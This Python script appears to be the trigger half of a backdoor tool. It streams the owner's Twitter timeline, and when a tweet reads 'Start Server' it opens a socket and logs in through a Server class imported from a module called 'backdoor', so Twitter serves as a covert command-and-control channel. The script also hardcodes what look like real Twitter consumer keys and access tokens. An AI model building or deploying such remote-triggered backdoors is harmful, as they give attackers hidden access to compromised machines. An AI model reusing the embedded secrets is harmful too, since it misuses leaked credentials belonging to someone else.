import tweepy, time, sys
import tweepy
from tweepy import StreamListener
from tweepy import Stream
from configparser import ConfigParser
from backdoor import Server

#Twitter
"""
config = ConfigParser()
config.read('config.ini')

CONSUMER_KEY = config['KEYS']['CONSUMER_KEY']
CONSUMER_SECRET = config['KEYS']['CONSUMER_SECRET']
ACCESS_TOKEN = config['KEYS']['ACCESS_TOKEN']
ACCESS_SECRET = config['KEYS']['ACCESS_SECRET']
"""
CONSUMER_KEY = 'gwpD9xlKnFmsjcFHR8n8Y0f2c'
CONSUMER_SECRET = 'wZylnQE4dRAWd3RE4wtwgkCi27Y4ZwI7bI3RCwdAcRNru6CqwT'
ACCESS_TOKEN = '1318646990150971392-wmLHwwuiuP9l51ZF9BI2rAt5eH3cJY'
ACCESS_SECRET = 'NAZDVh4EdocJwDwARPG4erlvAF3IF9PfbRel4T94sz1Sh'

auth = tweepy.OAuthHandler(CONSUMER_KEY, CONSUMER_SECRET)
auth.set_access_token(ACCESS_TOKEN, ACCESS_SECRET)
api = tweepy.API(auth)

class CustomStreamListener(tweepy.StreamListener):
	def __init__(self, message, server):
		super(CustomStreamListener, self).__init__()
		self.message = message
		self.server = server
	#Gets the message of the tweet
	def on_status(self, status):
		try:
			twitter_message = str(status.extended_tweet["full_text"])
			if twitter_message == self.message:
				socket = self.server.getSocket()
				self.server.login(socket)

		except AttributeError:
			twitter_message = str(status.text)
			if twitter_message == self.message:
				socket = self.server.getSocket()
				self.server.login(socket)

	def on_error(self, status_code):
		if status_code == 420:
			return False

def main():
	user_id = str(api.me().id)
	customServer = Server()
	myStreamListener = CustomStreamListener(message="Start Server", server = customServer)
	myStream = tweepy.Stream(auth = api.auth, listener = myStreamListener)

	print("Stream Listener Starting...")
	myStream.filter(follow = [user_id])


if __name__ == "__main__":
	main()
